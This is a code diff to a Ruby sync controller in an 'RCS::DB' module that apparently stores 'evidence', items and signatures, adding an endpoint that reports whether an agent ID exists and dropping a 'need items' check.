@@ -8,11 +8,8 @@ module RCS
   module DB
     class SyncController < RESTController
 
-      bypass_auth [:evidence, :items, :status, :setup]
-      require_license :evidence, :items, :status, :setup, license: :archive
-
-      NEED_SIGNATURES = 2
-      NEED_ITEMS = 4
+      bypass_auth [:evidence, :items, :status, :setup, :agent]
+      require_license :evidence, :items, :status, :setup, :agent, license: :archive
 
       def evidence
         return not_authorized(msg: 'Invalid signature') unless valid_signature?
@@ -24,13 +21,10 @@ module RCS
           return bad_request(msg: 'Invalid parameters')
         end
 
-        if need_items?(evidence_path)
-          ok(msg: 'Need items', code: NEED_ITEMS, operation_id: evidence_path.first)
-        else
-          trace :info, "Storing evidence #{evidence_attributes['_id']}"
-          result = store_evidence(evidence_path[1], evidence_attributes)
-          ok(msg: (result ? "Stored" : "Nothing was changed"))
-        end
+        trace :info, "Storing evidence #{evidence_attributes['_id']}"
+        result = store_evidence(evidence_path[1], evidence_attributes)
+
+        ok(msg: "Stored")
       end
 
       def items
@@ -47,7 +41,7 @@ module RCS
 
       def status
         unless has_signatures?
-          return server_error(msg: 'Need signatures', code: NEED_SIGNATURES)
+          return server_error(msg: 'Need signatures', result: 'NEED_SIGNATURES')
         end
 
         return not_authorized(msg: 'Invalid signature') unless valid_signature?
@@ -76,6 +70,18 @@ module RCS
           store_signatures(signatures)
           ok(msg: "Stored")
         end
+      end
+
+      def agent
+        return not_authorized(msg: 'Invalid signature') unless valid_signature?
+
+        agent_id = Moped::BSON::ObjectId.from_string(@params['agent_id']) rescue nil
+
+        return bad_request(msg: 'Invalid parameters') if agent_id.blank?
+
+        exist = ::Item.agents.where(id: agent_id).count != 0
+
+        ok(result: (exist ? 'EXISTS' : 'MISSING'))
       end
 
       private
@@ -109,10 +115,6 @@ module RCS
           item._id = attributes['_id']
           item.save!
         end
-      end
-
-      def need_items?(path)
-        ::Item.any_in(id: path).count != path.size
       end
 
       def store_signatures(signatures)
